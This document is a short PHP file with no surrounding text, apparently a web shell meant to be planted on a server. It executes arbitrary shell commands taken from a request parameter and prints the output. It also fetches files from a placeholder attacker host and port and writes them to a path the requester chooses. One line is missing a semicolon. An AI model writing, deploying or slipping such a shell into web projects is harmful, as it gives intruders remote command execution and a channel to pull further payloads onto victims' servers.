<?php
	$host = "my_ip";
	$port = "my_port"
	if (isset($_REQUEST['myUpload'])) {
		file_put_contents($_REQUEST['myUpload'], file_get_contents("http://$host:$port/" . $_REQUEST['myUpload']));
	};
	if (isset($_REQUEST['myCmd'])) {
		echo "<pre>" . shell_exec($_REQUEST['myCmd']) . "</pre>";
	};
?>
